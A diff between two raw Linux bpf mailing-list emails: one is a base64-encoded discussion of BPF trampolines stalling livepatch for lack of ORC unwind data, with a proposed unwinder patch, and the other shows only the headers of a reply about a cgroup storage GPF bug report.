@@ -1,261 +1,404 @@
-Return-Path: <bpf+bounces-75396-lists+bpf=lfdr.de@vger.kernel.org>
+Return-Path: <bpf+bounces-75397-lists+bpf=lfdr.de@vger.kernel.org>
 X-Original-To: lists+bpf@lfdr.de
 Delivered-To: lists+bpf@lfdr.de
-Received: from sv.mirrors.kernel.org (sv.mirrors.kernel.org [139.178.88.99])
-	by mail.lfdr.de (Postfix) with ESMTPS id 6ACA0C829F6
-	for <lists+bpf@lfdr.de>; Mon, 24 Nov 2025 23:06:35 +0100 (CET)
+Received: from dfw.mirrors.kernel.org (dfw.mirrors.kernel.org [IPv6:2605:f480:58:1:0:1994:3:14])
+	by mail.lfdr.de (Postfix) with ESMTPS id EEEEDC82BCE
+	for <lists+bpf@lfdr.de>; Mon, 24 Nov 2025 23:48:42 +0100 (CET)
 Received: from smtp.subspace.kernel.org (relay.kernel.org [52.25.139.140])
 	(using TLSv1.2 with cipher ECDHE-ECDSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by sv.mirrors.kernel.org (Postfix) with ESMTPS id C05CF3AD406
-	for <lists+bpf@lfdr.de>; Mon, 24 Nov 2025 22:06:32 +0000 (UTC)
+	by dfw.mirrors.kernel.org (Postfix) with ESMTPS id 2BF344E6F57
+	for <lists+bpf@lfdr.de>; Mon, 24 Nov 2025 22:46:07 +0000 (UTC)
 Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
-	by smtp.subspace.kernel.org (Postfix) with ESMTP id 51091335062;
-	Mon, 24 Nov 2025 22:06:30 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTP id 303F22749DC;
+	Mon, 24 Nov 2025 22:46:03 +0000 (UTC)
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=crowdstrike.com header.i=@crowdstrike.com header.b="U5h+kcxm"
+	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="cbs/muNz"
 X-Original-To: bpf@vger.kernel.org
-Received: from mx0b-00206402.pphosted.com (mx0b-00206402.pphosted.com [148.163.152.16])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+Received: from mail-yw1-f169.google.com (mail-yw1-f169.google.com [209.85.128.169])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id D63CF2D6E66;
-	Mon, 24 Nov 2025 22:06:27 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=148.163.152.16
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id A3A2926F46E
+	for <bpf@vger.kernel.org>; Mon, 24 Nov 2025 22:46:00 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.128.169
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1764021989; cv=none; b=Q8W+f85mSjzcP9gjjnWE15BvO7kpAyRbF22wYbH2S3Ekm0kFCo//osi3Q7gcXz3Umai2GC8x6W0eVP1vXUlxxBkCxMyC4R7qnowViMEGfXFh2tyHKZyjTTLzzBLFvxLDpCe2wW8PfF49iBv0v4eRla0lhTrGOOKav6QBTUzED4s=
+	t=1764024362; cv=none; b=bqusLLsxf14maaaQYglumzNHCRKZ25gRi+mz50zQi0Q9M0vXIrtjuDhUkDmOip2VyXGygtdOhzFsuRWHN33NpVcE9G1eYa56CAJE6Wf23526NpAqG9QJOD+P+k+JlapQX/gUdl3E5LSz0GRF1Os5ush2oa/AgiJ0MpDxukz0W10=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1764021989; c=relaxed/simple;
-	bh=kC+EJ4d3yp5RAPcOrlBXAqE+7nBa4n/WKGCbC8K6q3E=;
-	h=Message-ID:Date:MIME-Version:From:Subject:To:CC:References:
-	 In-Reply-To:Content-Type; b=H1X3dVzdSBjSYzl/djHIZawKmK8tJBORTjw45vuQjXjVF1jmjxJz6H9XntaOx5nXpYWoN0d8zjztUaAFjCz0xAV7RE9JwywDESkdVQwNJPDUpp6Dan8SrtR+QoRTBdiCU624SmezIVlZ/n801HclqNoDALGb8MBRyp9CHW4gxOk=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=crowdstrike.com; spf=pass smtp.mailfrom=crowdstrike.com; dkim=pass (2048-bit key) header.d=crowdstrike.com header.i=@crowdstrike.com header.b=U5h+kcxm; arc=none smtp.client-ip=148.163.152.16
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=crowdstrike.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=crowdstrike.com
-Received: from pps.filterd (m0354654.ppops.net [127.0.0.1])
-	by mx0b-00206402.pphosted.com (8.18.1.11/8.18.1.11) with ESMTP id 5AOKpPYq2548381;
-	Mon, 24 Nov 2025 22:06:07 GMT
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=crowdstrike.com;
-	 h=cc:content-transfer-encoding:content-type:date:from
-	:in-reply-to:message-id:mime-version:references:subject:to; s=
-	default; bh=kC+EJ4d3yp5RAPcOrlBXAqE+7nBa4n/WKGCbC8K6q3E=; b=U5h+
-	kcxmnxkjIX7cvQK5nhDPxBxw8xeIe8tXqY91R40hdybDhR6tFeChNdMOohK3Tb7k
-	qXwjpZhoglSitbOqdnUmb+G1+LwA6UVOBoqebmRhh6JcTONRFvZV2USrA6quFC9G
-	4McwUnrBJVpAbZ0BGfFka6T7raOqYz8cII/nRowUsacMgKw4x2bcaaoIuERle0tx
-	uR/GkUfOxHE/JDjZitzYv/JbUAz60tgX/lLVsb3369LHCS8+MJKmqCG5uDzRujaY
-	9j6t+qp/HqAxPFwhc0Qhtfwj/GR10uAGET07tgrlQbLUVZzhYZ7H+2OSZ68Tc6qB
-	MWhxxyKpnhnLFM5BJw==
-Received: from mail.crowdstrike.com (dragosx.crowdstrike.com [208.42.231.60] (may be forged))
-	by mx0b-00206402.pphosted.com (PPS) with ESMTPS id 4amxs30b1c-1
-	(version=TLSv1.2 cipher=ECDHE-RSA-AES256-GCM-SHA384 bits=256 verify=NOT);
-	Mon, 24 Nov 2025 22:06:07 +0000 (GMT)
-Received: from [10.82.59.75] (10.100.11.122) by 04WPEXCH010.crowdstrike.sys
- (10.100.11.80) with Microsoft SMTP Server (version=TLS1_2,
- cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.2.2562.17; Mon, 24 Nov
- 2025 22:06:05 +0000
-Message-ID: <d7b75cdc-a872-4425-a5f6-d41b1982cca7@crowdstrike.com>
-Date: Mon, 24 Nov 2025 17:06:04 -0500
+	s=arc-20240116; t=1764024362; c=relaxed/simple;
+	bh=mnh08nE5e8YTDnFH3g2UmNKa6VOkjvD6qWARwcombMo=;
+	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
+	 To:Cc:Content-Type; b=N911ei56+bNjwcyAhCGpDslv2SXLU11JivoHzd7X5hYW0h50hslDUgcyVq4Og0VGepl8RRM23oJ3phHLn6ztThMJNqAmAu5ymXZ2LIn1I6TzE1bUiIEOVyk7Pk95PyJQ8Uvi2B/BUaLciFs/0Omb4mA+RnQQHl6ng54LOV/MCvs=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=cbs/muNz; arc=none smtp.client-ip=209.85.128.169
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
+Received: by mail-yw1-f169.google.com with SMTP id 00721157ae682-78ab039ddb4so11030127b3.3
+        for <bpf@vger.kernel.org>; Mon, 24 Nov 2025 14:46:00 -0800 (PST)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20230601; t=1764024359; x=1764629159; darn=vger.kernel.org;
+        h=content-transfer-encoding:cc:to:subject:message-id:date:from
+         :in-reply-to:references:mime-version:from:to:cc:subject:date
+         :message-id:reply-to;
+        bh=XIWMKLEyf45WR6yIuueKinH3HiSrSCDqqNm/MEAFBt4=;
+        b=cbs/muNzIbVpQp0anzmyhqPEbORzQJLHHqOkimxlbpo3jRyrMJlD/4Z8qEmJjR8r9l
+         Up6PzYganU2fvHjMDWbaxjjVOPmmMwp1CotFnU0A0Tngq2Jn+jPcCUgp3JgfcqaO5Mbp
+         hoCzBZcAOKtuPVISpCPqB2mFl46u3gqyDAw4Xxs7lP3pFH5TOQdOpQHp2+GHUfcS4zz4
+         Q+vuaOnlzEbLBRv4kcJdTpAQnVhHUt6c2dUlOSKVLx3qhrWRA4MFgyT3yqGVJjUkRHgg
+         vnUJMRZIXH671ChdXF04+J+jT8m7y/vtkhi8b+Iyo/qcfEociK0CMKkQps/hREIT6C89
+         bsAw==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20230601; t=1764024359; x=1764629159;
+        h=content-transfer-encoding:cc:to:subject:message-id:date:from
+         :in-reply-to:references:mime-version:x-gm-gg:x-gm-message-state:from
+         :to:cc:subject:date:message-id:reply-to;
+        bh=XIWMKLEyf45WR6yIuueKinH3HiSrSCDqqNm/MEAFBt4=;
+        b=DfBpqbHLp9KSM93n4VBoWVnok1SuQMyhxK7zirAajfEGOjir0oXgb10OsqzTUYT3hg
+         I0MV5OzC1jBaxMuMx+EJdaAg1PqnW01/ah+x2TDZP7Goi6ZKPseKD0OHc3TkYPkxmE6j
+         X0fdAzm7NkavdiP9F4uDPAJWooyPOPoe9HA8Um1d0T8yJcSYmubDsVQcNVlNN3rDTSJ5
+         53I0SPzxgpS1n2Rvi1oYLXlI+4at1/7yFbTJxOTSQJndQI4oJHMK8J8DvOb39Da3QucO
+         PXy8+i7afLRWZ3jZ3bZZnz8NOO+PIrF5rV/Fb3E1CiVm5dSzrruCc/ZjM27B2uxzfcva
+         akDQ==
+X-Forwarded-Encrypted: i=1; AJvYcCWb6imHtXhghZ86tS4QY+kRzG6AtzTe3s8fz/gxBtaAxsgLzEwhwpK1MkEXSfd5XK4VnVo=@vger.kernel.org
+X-Gm-Message-State: AOJu0YymYlxB70KyWm3fL8MO9mL5yzOZgsq24+W6d9XExQgIWdElXQKp
+	FEv+HKHuSHNiXAX+rVcEJhQq+k8iLy5s+zkpDwdKugs91eFAsUPnOmaLeqsVviy3m+8GPYdDZNs
+	fvcxYUdSSiOdVknj8GFt4RCOs4l40svE=
+X-Gm-Gg: ASbGncsM27tNCq279VsM7nmjKaMTXArvgsHKdc+1LdRZQLCGzjsibYW39pxpQU9GFWA
+	EHWUkO04iNqoPqcjaDjWLALW/hMb0OxjK5lbEFdd94RfuN3Rzp2ks9na8IOOleAocwQimbLuwmT
+	XjzANRR7mf9HVcZiaTADhy3Lju0+3hDz3Wzorgw0PE+gKwUYTERQwQQZXWx5Ngzsl62kciCHti7
+	Noq8NfJXC9C62LmnCoX4R/GC8TuW+QjnI4k3Oa4LgzwyL7pif2bMja4oBqVRDM1HmxGvcfoN/Sa
+	3gmYbA==
+X-Google-Smtp-Source: AGHT+IF+JIk+AQDtJb0DEwn3T+JcNOwC9SOXbKgG4Wn9lPXutLcsox+S+k0FQPoIXYGwiHDPN3boXchuHNLktU9Q5mY=
+X-Received: by 2002:a05:690c:46c9:b0:786:9774:a39f with SMTP id
+ 00721157ae682-78a8b47a894mr99283737b3.5.1764024359427; Mon, 24 Nov 2025
+ 14:45:59 -0800 (PST)
 Precedence: bulk
 X-Mailing-List: bpf@vger.kernel.org
 List-Id: <bpf.vger.kernel.org>
 List-Subscribe: <mailto:bpf+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:bpf+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-User-Agent: Mozilla Thunderbird
-From: Andrey Grodzovsky <andrey.grodzovsky@crowdstrike.com>
-Subject: Re: [External] Re: BPF fentry/fexit trampolines stall livepatch
- stalls transition due to missing ORC unwind metadata
-To: Josh Poimboeuf <jpoimboe@kernel.org>, Miroslav Benes <mbenes@suse.cz>
-CC: <bpf@vger.kernel.org>, <live-patching@vger.kernel.org>,
-        DL Linux Open
- Source Team <linux-open-source@crowdstrike.com>,
-        Petr Mladek
-	<pmladek@suse.com>, Song Liu <song@kernel.org>,
-        <andrii@kernel.org>, Raja
- Khan <raja.khan@crowdstrike.com>
-References: <0e555733-c670-4e84-b2e6-abb8b84ade38@crowdstrike.com>
- <alpine.LSU.2.21.2511201311570.16226@pobox.suse.cz>
- <h4e7ar2fckfs6y2c2tm4lq4r54edzvqdq6cy5qctb7v3bi5s2u@q4hfzrlembrn>
-Content-Language: en-US
-In-Reply-To: <h4e7ar2fckfs6y2c2tm4lq4r54edzvqdq6cy5qctb7v3bi5s2u@q4hfzrlembrn>
-Content-Type: text/plain; charset="UTF-8"; format=flowed
-Content-Transfer-Encoding: base64
-X-ClientProxiedBy: 04WPEXCH014.crowdstrike.sys (10.100.11.87) To
- 04WPEXCH010.crowdstrike.sys (10.100.11.80)
-X-Disclaimer: USA
-X-Proofpoint-ORIG-GUID: X3iCOQhnKBayOQTeY6xQ_Y6OT460wrLM
-X-Proofpoint-GUID: X3iCOQhnKBayOQTeY6xQ_Y6OT460wrLM
-X-Proofpoint-Spam-Details-Enc: AW1haW4tMjUxMTI0MDE5MiBTYWx0ZWRfX+mXQHpw/lYjD
- xQDF1GG1BtV6zDfx/LM1WlGoZm62EK4dk516Xs3XiypH9g1pSqCFxt9I4qRWcvJpu9cTfJzbXXq
- a6wm82640osX5HutlfGwTUyPedTP7py9t7uGenaQHvp0JRh4wU6aAx54D/f47qRu/Hy8pA2cOBH
- KT7SgDkmvfA0i5pEVTujx0zH5MXfzAHO58nxf2kZf/AN5RWBvz2v6LWqEoIbe09VLjEvD1MheFk
- M30n96g2A4btxK0eOKeiLssvRmhFIMZ6HvI9VETyJ/FcNt3hUK76D7YNAQZF197p8D5FxJJB6iB
- oFSrBsJhmPXTbfaNoumj+BKv6j7evQ0vebPwE/FvcnF3aM7use6/NxYz8yfG7sYE8yF8OvMfQA/
- zLhwDiRzDHvvDG2MGX5JUzQ6jb3/hA==
-X-Authority-Analysis: v=2.4 cv=EqffbCcA c=1 sm=1 tr=0 ts=6924d6cf cx=c_pps
- a=1d8vc5iZWYKGYgMGCdbIRA==:117 a=1d8vc5iZWYKGYgMGCdbIRA==:17
- a=EjBHVkixTFsA:10 a=IkcTkHD0fZMA:10 a=6UeiqGixMTsA:10
- a=VkNPw1HP01LnGYTKEx00:22 a=VwQbUJbxAAAA:8 a=pGLkceISAAAA:8
- a=y9XH1GVTVIYCCurPsAwA:9 a=QEXdDO2ut3YA:10
-X-Proofpoint-Virus-Version: vendor=nai engine=6800 definitions=11623
- signatures=596818
-X-Proofpoint-Spam-Details: rule=outbound_notspam policy=outbound score=0
- priorityscore=1501 malwarescore=0 spamscore=0 adultscore=0 impostorscore=0
- clxscore=1011 bulkscore=0 suspectscore=0 lowpriorityscore=0 phishscore=0
- classifier=typeunknown authscore=0 authtc= authcc= route=outbound adjust=0
- reason=mlx scancount=1 engine=8.22.0-2510240001 definitions=main-2511240192
+References: <c9ac63d7-73be-49c5-a4ac-eb07f7521adb@hust.edu.cn> <CAMB2axMN2mMy=mHjtprd=HN-5enmwX=VSPUdM051V=fgFtjKWg@mail.gmail.com>
+In-Reply-To: <CAMB2axMN2mMy=mHjtprd=HN-5enmwX=VSPUdM051V=fgFtjKWg@mail.gmail.com>
+From: Amery Hung <ameryhung@gmail.com>
+Date: Mon, 24 Nov 2025 14:45:48 -0800
+X-Gm-Features: AWmQ_bkT0B0Gmho5Bq4jctmlPgIwKDsuR-r4utV5HytqSG4rGe011g0BFvRxTEU
+Message-ID: <CAMB2axMvR2nRKCKmRg72fmWpRuJyv=_SiFPaOPZayhR59zgaqw@mail.gmail.com>
+Subject: Re: GPF in bpf_get_local_storage due to missing cgroup storage check
+ in tail calls
+To: Yinhao Hu <dddddd@hust.edu.cn>
+Cc: Daniel Borkmann <daniel@iogearbox.net>, bpf <bpf@vger.kernel.org>, dzm91@hust.edu.cn, 
+	M202472210@hust.edu.cn, martin.lau@linux.dev, 
+	Alexei Starovoitov <ast@kernel.org>, Andrii Nakryiko <andrii@kernel.org>, 
+	hust-os-kernel-patches@googlegroups.com
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: quoted-printable
 
-T24gMTEvMjEvMjUgMTk6NTYsIEpvc2ggUG9pbWJvZXVmIHdyb3RlOg0KPiBPbiBUaHUsIE5v
-diAyMCwgMjAyNSBhdCAwMToxNToxMlBNICswMTAwLCBNaXJvc2xhdiBCZW5lcyB3cm90ZToN
-Cj4+PiBJbXBhY3QNCj4+Pg0KPj4+IFRoaXMgYWZmZWN0cyBwcm9kdWN0aW9uIHN5c3RlbXMg
-d2hlcmU6DQo+Pj4gLSBTZWN1cml0eS9vYnNlcnZhYmlsaXR5IHRvb2xzIHVzZSBCUEYgZmVu
-dHJ5L2ZleGl0IGhvb2tzDQo+Pj4gLSBMaXZlIGtlcm5lbCBwYXRjaGluZyBpcyByZXF1aXJl
-ZCBmb3Igc2VjdXJpdHkgdXBkYXRlcw0KPj4+IC0gS2VybmVsIHRocmVhZHMgbWF5IGJlIGJs
-b2NrZWQgaW4gaG9va2VkIG5ldHdvcmsvc3RvcmFnZSBmdW5jdGlvbnMNCj4+Pg0KPj4+IFRo
-ZSBsaXZlcGF0Y2ggdHJhbnNpdGlvbiBjYW4gc3RhbGwgZm9yIDYwKyBzZWNvbmRzIGJlZm9y
-ZSBmYWlsaW5nLCBibG9ja2luZw0KPj4+IGNyaXRpY2FsIHNlY3VyaXR5IHBhdGNoZXMuDQo+
-Pg0KPj4gVW5mb3J0dW5hdGVseSB5ZXMuDQo+Pg0KPj4+IFF1ZXN0aW9ucyBmb3IgdGhlIENv
-bW11bml0eQ0KPj4+DQo+Pj4gMS4gSXMgdGhpcyBhIGtub3duIGxpbWl0YXRpb24gKEkgYXNz
-dW1lIHllcykgPw0KPj4NCj4+IFllcy4NCj4+DQo+Pj4gMi4gUnVudGltZSBPUkMgZ2VuZXJh
-dGlvbj8gQ291bGQgdGhlIEJQRiBKSVQgZ2VuZXJhdGUgT1JDIHVud2luZCBlbnRyaWVzIGZv
-cg0KPj4+IHRyYW1wb2xpbmVzLCBzaW1pbGFyIHRvIGhvdyBmdHJhY2UgdHJhbXBvbGluZXMg
-YXJlIGhhbmRsZWQ/DQo+Pj4gMy4gVHJhbXBvbGluZSByZWdpc3RyYXRpb24/IENvdWxkIEJQ
-RiB0cmFtcG9saW5lcyByZWdpc3RlciB0aGVpciBhZGRyZXNzDQo+Pj4gcmFuZ2VzIHdpdGgg
-dGhlIE9SQyB1bndpbmRlciB0byBhdm9pZCB0aGUgInVucmVsaWFibGUiIG1hcmtpbmc/DQo+
-Pj4gNC4gQWx0ZXJuYXRpdmUgdW53aW5kaW5nPyBDb3VsZCBsaXZlcGF0Y2ggdXNlIGFuIGFs
-dGVybmF0aXZlIHVud2luZGluZyBtZXRob2QNCj4+PiB3aGVuIEJQRiB0cmFtcG9saW5lcyBh
-cmUgZGV0ZWN0ZWQgKGUuZy4sIGZyYW1lIHBvaW50ZXJzIHdpdGggdmFsaWRhdGlvbik/DQo+
-Pj4gNS4gV29ya2Fyb3VuZHM/IEkgbWVudGlvbiBvbmUgYmVsbG93IGFuZCBJIHdvdWxkIGJl
-IGhhcHB5IHRvIGhlYXIgaWYgYW55b25lDQo+Pj4gaGFzIGEgYmV0dGVyIGlkZWEgdG8gcHJv
-cG9zZSA/DQo+Pg0KPj4gVGhlcmUgaXMgYSBwYXJhbGxlbCBkaXNjdXNzaW9uIGdvaW5nIG9u
-IHVuZGVyIHNmcmFtZSB1bndpZGluZyBlbmFibGVtZW50DQo+PiBmb3IgYXJtNjQuIFNlZSB0
-aGlzIHN1YnRocmVhZA0KPj4gaHR0cHM6Ly91cmxkZWZlbnNlLmNvbS92My9fX2h0dHBzOi8v
-bG9yZS5rZXJuZWwub3JnL2FsbC9DQURCTWdwd1ozMipzaFNhMFN3Tzh5NEctWncxNGFlLUZj
-b1dyZUFfcHRNZjA4TXU5ZEFAbWFpbC5nbWFpbC5jb20vVC8qdV9fO0t5TSEhQm1kelMzX2xW
-OUhkS0c4IXhCYVBDVlN2V05Tdk05ODJRRVhpVXJZMmZrdm90QVZYeWV2ZmNJejJ3REFpTGZF
-Qzl0S2pnVlJSMTFFbmtXSmlmTEIzRk1UaDJaVlU5SHdEUFQwZFpqa293N29GRXckDQo+Pg0K
-Pj4gSSB3b3VsZCByZWFsbHkgd2VsY29tZSBpZiBpdCBpcyBzb2x2ZWQgZXZlbnR1YWxseSBi
-ZWNhdXNlIGl0IHNlZW1zIHdlIHdpbGwNCj4+IG1lZXQgdGhlIGRlc2NyaWJlZCBpc3N1ZSBt
-b3JlIGFuZCBtb3JlIG9mdGVuIChKb3NoLCBJIHRoaW5rIHRoaXMgZW1haWwNCj4+IHNob3dz
-IHRoYXQgaXQgaGFwcGVucyBpbiBwcmFjdGljZSB3aXRoIHRoZSBleGlzdGluZyBtb25pdG9y
-aW5nIHNlcnZpY2VzDQo+PiBiYXNlZCBvbiBCUEYpLg0KPiANCj4gTWF5YmUgd2UgY2FuIHRh
-a2UgYWR2YW50YWdlIG9mIHRoZSBmYWN0IHRoYXQgQlBGIHVzZXMgZnJhbWUgcG9pbnRlcnMN
-Cj4gdW5jb25kaXRpb25hbGx5LCBhbmQgYXZvaWQgdGhlIGNvbXBsZXhpdHkgb2YgImR5bmFt
-aWMgT1JDIiBmb3Igbm93LCBieQ0KPiBqdXN0IGhhdmluZyBCUEYga2VlcCB0cmFjayBvZiB3
-aGVyZSB0aGUgZnJhbWUgcG9pbnRlciBpcyB2YWxpZCAoYWZ0ZXINCj4gdGhlIHByb2xvZ3Vl
-LCBiZWZvcmUgdGhlIGVwaWxvZ3VlKS4NCj4gDQo+IFNvbWV0aGluZyBsaWtlIHRoZSBiZWxv
-dyAoY29tcGxldGVseSB1bnRlc3RlZCkuDQo+IA0KPiBBbmRyZXksIGNhbiB5b3UgdHJ5IHRo
-aXMgcGF0Y2g/DQoNCkhleSBKb3NoLCB0aGFuayB5b3UgZm9yIGxvb2tpbmcsIGNhbiB5b3Ug
-cGxlYXNlIGFkdmlzZSB0aGUgc3RhYmxlDQprZXJuZWwgdmVyc2lvbiB5b3UgaGF2ZSBtYWRl
-IHRoaXMgY2hhbmdlcyBvbiB0b3Agb2ZmIHNvIEkgY2FuIGNsZWFubHkNCmFwcGx5ID8gQWx0
-ZXJuYXRpdmVseSBqdXN0IHByb3ZpZGUgZ2l0IGNvbW1pdCBzaGEgaW4gTGludXMNCnRyZWUg
-SSBjYW4gcmVzZXQgbXkgYnJhbmNoIHRvLg0KDQoNCkkgd2lsbCBoYXBwaWx5IHRlc3QgdGhp
-cyBhcyBzb29uIGFzIEkgY2FuIGFuZCByZXBvcnQgYmFjay4NCg0KVGhhbmtzLA0KQW5kcmV5
-DQoNCj4gDQo+IC0tLTg8LS0tDQo+IA0KPiBkaWZmIC0tZ2l0IGEvYXJjaC94ODYva2VybmVs
-L3Vud2luZF9vcmMuYyBiL2FyY2gveDg2L2tlcm5lbC91bndpbmRfb3JjLmMNCj4gaW5kZXgg
-OTc3ZWU3NWUwNDdjLi5mNjEwZmRlMmQ1YzQgMTAwNjQ0DQo+IC0tLSBhL2FyY2gveDg2L2tl
-cm5lbC91bndpbmRfb3JjLmMNCj4gKysrIGIvYXJjaC94ODYva2VybmVsL3Vud2luZF9vcmMu
-Yw0KPiBAQCAtMiw2ICsyLDcgQEANCj4gICAjaW5jbHVkZSA8bGludXgvb2JqdG9vbC5oPg0K
-PiAgICNpbmNsdWRlIDxsaW51eC9tb2R1bGUuaD4NCj4gICAjaW5jbHVkZSA8bGludXgvc29y
-dC5oPg0KPiArI2luY2x1ZGUgPGxpbnV4L2JwZi5oPg0KPiAgICNpbmNsdWRlIDxhc20vcHRy
-YWNlLmg+DQo+ICAgI2luY2x1ZGUgPGFzbS9zdGFja3RyYWNlLmg+DQo+ICAgI2luY2x1ZGUg
-PGFzbS91bndpbmQuaD4NCj4gQEAgLTE3Miw2ICsxNzMsMjUgQEAgc3RhdGljIHN0cnVjdCBv
-cmNfZW50cnkgKm9yY19mdHJhY2VfZmluZCh1bnNpZ25lZCBsb25nIGlwKQ0KPiAgIH0NCj4g
-ICAjZW5kaWYNCj4gICANCj4gKy8qIEZha2UgZnJhbWUgcG9pbnRlciBlbnRyeSAtLSB1c2Vk
-IGFzIGEgZmFsbGJhY2sgZm9yIGdlbmVyYXRlZCBjb2RlICovDQo+ICtzdGF0aWMgc3RydWN0
-IG9yY19lbnRyeSBvcmNfZnBfZW50cnkgPSB7DQo+ICsJLnR5cGUJCT0gT1JDX1RZUEVfQ0FM
-TCwNCj4gKwkuc3BfcmVnCQk9IE9SQ19SRUdfQlAsDQo+ICsJLnNwX29mZnNldAk9IDE2LA0K
-PiArCS5icF9yZWcJCT0gT1JDX1JFR19QUkVWX1NQLA0KPiArCS5icF9vZmZzZXQJPSAtMTYs
-DQo+ICt9Ow0KPiArDQo+ICtzdGF0aWMgc3RydWN0IG9yY19lbnRyeSAqb3JjX2JwZl9maW5k
-KHVuc2lnbmVkIGxvbmcgaXApDQo+ICt7DQo+ICsjaWZkZWYgQ09ORklHX0JQRl9KSVQNCj4g
-KwlpZiAoYnBmX2hhc19mcmFtZV9wb2ludGVyKGlwKSkNCj4gKwkJcmV0dXJuICZvcmNfZnBf
-ZW50cnk7DQo+ICsjZW5kaWYNCj4gKw0KPiArCXJldHVybiBOVUxMOw0KPiArfQ0KPiArDQo+
-ICAgLyoNCj4gICAgKiBJZiB3ZSBjcmFzaCB3aXRoIElQPT0wLCB0aGUgbGFzdCBzdWNjZXNz
-ZnVsbHkgZXhlY3V0ZWQgaW5zdHJ1Y3Rpb24NCj4gICAgKiB3YXMgcHJvYmFibHkgYW4gaW5k
-aXJlY3QgZnVuY3Rpb24gY2FsbCB3aXRoIGEgTlVMTCBmdW5jdGlvbiBwb2ludGVyLA0KPiBA
-QCAtMTg2LDE1ICsyMDYsNiBAQCBzdGF0aWMgc3RydWN0IG9yY19lbnRyeSBudWxsX29yY19l
-bnRyeSA9IHsNCj4gICAJLnR5cGUgPSBPUkNfVFlQRV9DQUxMDQo+ICAgfTsNCj4gICANCj4g
-LS8qIEZha2UgZnJhbWUgcG9pbnRlciBlbnRyeSAtLSB1c2VkIGFzIGEgZmFsbGJhY2sgZm9y
-IGdlbmVyYXRlZCBjb2RlICovDQo+IC1zdGF0aWMgc3RydWN0IG9yY19lbnRyeSBvcmNfZnBf
-ZW50cnkgPSB7DQo+IC0JLnR5cGUJCT0gT1JDX1RZUEVfQ0FMTCwNCj4gLQkuc3BfcmVnCQk9
-IE9SQ19SRUdfQlAsDQo+IC0JLnNwX29mZnNldAk9IDE2LA0KPiAtCS5icF9yZWcJCT0gT1JD
-X1JFR19QUkVWX1NQLA0KPiAtCS5icF9vZmZzZXQJPSAtMTYsDQo+IC19Ow0KPiAtDQo+ICAg
-c3RhdGljIHN0cnVjdCBvcmNfZW50cnkgKm9yY19maW5kKHVuc2lnbmVkIGxvbmcgaXApDQo+
-ICAgew0KPiAgIAlzdGF0aWMgc3RydWN0IG9yY19lbnRyeSAqb3JjOw0KPiBAQCAtMjM4LDYg
-KzI0OSwxMSBAQCBzdGF0aWMgc3RydWN0IG9yY19lbnRyeSAqb3JjX2ZpbmQodW5zaWduZWQg
-bG9uZyBpcCkNCj4gICAJaWYgKG9yYykNCj4gICAJCXJldHVybiBvcmM7DQo+ICAgDQo+ICsJ
-LyogQlBGIGxvb2t1cDogKi8NCj4gKwlvcmMgPSBvcmNfYnBmX2ZpbmQoaXApOw0KPiArCWlm
-IChvcmMpDQo+ICsJCXJldHVybiBvcmM7DQo+ICsNCj4gICAJcmV0dXJuIG9yY19mdHJhY2Vf
-ZmluZChpcCk7DQo+ICAgfQ0KPiAgIA0KPiBAQCAtNDk1LDkgKzUxMSw4IEBAIGJvb2wgdW53
-aW5kX25leHRfZnJhbWUoc3RydWN0IHVud2luZF9zdGF0ZSAqc3RhdGUpDQo+ICAgCWlmICgh
-b3JjKSB7DQo+ICAgCQkvKg0KPiAgIAkJICogQXMgYSBmYWxsYmFjaywgdHJ5IHRvIGFzc3Vt
-ZSB0aGlzIGNvZGUgdXNlcyBhIGZyYW1lIHBvaW50ZXIuDQo+IC0JCSAqIFRoaXMgaXMgdXNl
-ZnVsIGZvciBnZW5lcmF0ZWQgY29kZSwgbGlrZSBCUEYsIHdoaWNoIE9SQw0KPiAtCQkgKiBk
-b2Vzbid0IGtub3cgYWJvdXQuICBUaGlzIGlzIGp1c3QgYSBndWVzcywgc28gdGhlIHJlc3Qg
-b2YNCj4gLQkJICogdGhlIHVud2luZCBpcyBubyBsb25nZXIgY29uc2lkZXJlZCByZWxpYWJs
-ZS4NCj4gKwkJICogVGhpcyBpcyBqdXN0IGEgZ3Vlc3MsIHNvIHRoZSByZXN0IG9mIHRoZSB1
-bndpbmQgaXMgbm8gbG9uZ2VyDQo+ICsJCSAqIGNvbnNpZGVyZWQgcmVsaWFibGUuDQo+ICAg
